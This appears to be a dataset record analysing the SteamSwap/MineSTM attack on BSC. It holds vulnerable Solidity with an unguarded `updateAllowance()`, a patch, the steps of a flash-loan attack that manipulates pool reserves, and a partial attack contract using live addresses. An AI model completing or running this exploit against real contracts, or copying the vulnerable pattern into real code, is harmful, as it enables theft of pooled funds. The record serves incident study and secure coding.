@@ -1,0 +1,37 @@
+{
+ "id": "2024__2024-06-XX_SteamSwap_UpdateAllowanceSellLarge",
+ "source_file": "2024/2024-06-XX_SteamSwap_UpdateAllowanceSellLarge.md",
+ "title": "SteamSwap — updateAllowance() + sell() Large-Scale Attack Analysis",
+ "date": "2024-06-01",
+ "protocol": "SteamSwap",
+ "chain": "BSC",
+ "loss_raw": "~$91,000",
+ "loss_usd": 91000.0,
+ "root_cause": "`updateAllowance()` + `sell()` vulnerability enabling AMM reserve manipulation for profit — lack of access control allows arbitrary callers to update allowance and execute large-scale sells",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: MineSTM updateAllowance + sell (unpatched)\ncontract MineSTM {\n    // Remains unpatched after the initial attack (~$13.8K)\n    function updateAllowance() external {\n        // No access control — still callable by anyone\n        uint256 pairBalance = STM.balanceOf(pair);\n        internalAllowance[msg.sender] = pairBalance;\n    }\n\n    function sell(uint256 numerator, uint256 denominator) external {\n        uint256 allowance = internalAllowance[msg.sender];\n        uint256 sellAmount = allowance * numerator / denominator;\n        uint256 busdt = calculateBUSDT(sellAmount);\n        STM.transferFrom(msg.sender, address(this), sellAmount);\n        BUSDT.transfer(msg.sender, busdt);\n    }\n}\n\n//",
+  "// File: SteamSwap_decompiled.sol\ncontract SteamSwap {\n    function updateAllowance() external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: Immediate patch required\nfunction updateAllowance() external onlyOwner {\n    // Only owner can update allowance\n}\n\nfunction sell(uint256 amount) external {\n    require(amount <= MAX_SELL_PER_TX, \"exceeds limit\");\n    // Use TWAP-based price\n    uint256 price = getTWAPPrice();\n    uint256 busdt = amount * price / PRECISION;\n    STM.transferFrom(msg.sender, address(this), amount);\n    BUSDT.transfer(msg.sender, busdt);\n}"
+ ],
+ "steps": [
+  "→ [1] PancakeV3 Flash Loan: 500,000 BUSDT",
+  "→ [2] BUSDT/STM pair.sync()",
+  "→ [3] Swap 500,000 BUSDT → STM (PancakeRouter)",
+  "→ [4] MineSTM.updateAllowance()",
+  "Unpatched → allowance set using manipulated pair balance",
+  "→ [5] MineSTM.sell(numerator, denominator) × multiple calls",
+  "→ [6] Repay V3 flash loan (500,050 BUSDT)",
+  "→ [7] ~$91K profit (~6.6x the initial MineSTM attack)"
+ ],
+ "other_code": [
+  "Attacker (SteamSwap)\n  │\n  ├─→ [1] PancakeV3 Flash Loan: 500,000 BUSDT\n  │         └─ 0x92b7807bF19b7DDdf89b706143896d05228f3121\n  │         └─ 10x the scale of the MineSTM attack\n  │\n  ├─→ [2] BUSDT/STM pair.sync()\n  │         └─ Reserve manipulation\n  │\n  ├─→ [3] Swap 500,000 BUSDT → STM (PancakeRouter)\n  │         └─ Acquire large amount of STM\n  │\n  ├─→ [4] MineSTM.updateAllowance()\n  │         └─ Unpatched → allowance set using manipulated pair balance\n  │\n  ├─→ [5] MineSTM.sell(numerator, denominator) × multiple calls\n  │         └─ Receive excess BUSDT via manipulated allowance\n  │\n  ├─→ [6] Repay V3 flash loan (500,050 BUSDT)\n  │\n  └─→ [7] ~$91K profit (~6.6x the initial MineSTM attack)",
+  "interface IMineSTM {\n    function updateAllowance() external;\n    function sell(uint256 numerator, uint256 denominator) external;\n}\n\ninterface IPancakeV3Pool {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    IMineSTM constant mineSTM = IMineSTM(0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6);\n    IPancakeV3Pool constant v3Pool = IPancakeV3Pool(0x92b7807bF19b7DDdf89b706143896d05228f3121);\n    IUniswapV2Pair constant stmPair = IUniswapV2Pair(0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C);\n    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 constant STM = IERC20(0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0);\n\n    function testExploit() external {\n        // [1] 10x the initial"
+ ]
+}
